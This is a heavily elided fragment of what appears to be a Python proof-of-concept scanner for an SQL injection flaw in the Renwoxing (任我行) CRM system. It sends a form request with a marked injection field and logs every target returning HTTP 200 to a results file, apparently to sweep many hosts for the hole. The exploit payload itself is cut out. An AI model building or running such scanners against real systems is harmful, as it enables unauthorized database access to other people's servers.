...
def main():
    banner()
    parser = argparse.ArgumentParser(description="任我行CRM系统SQL注入漏洞")
...
def poc(target):
    ...
    data = """Keywords=&StartSendDate=2023-07-17&EndSendDate=2023-08-10&SenderTypeId=0000000000*"""
    try:
        ...
        if res1.status_code == 200:
            ...
            with open('result50.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
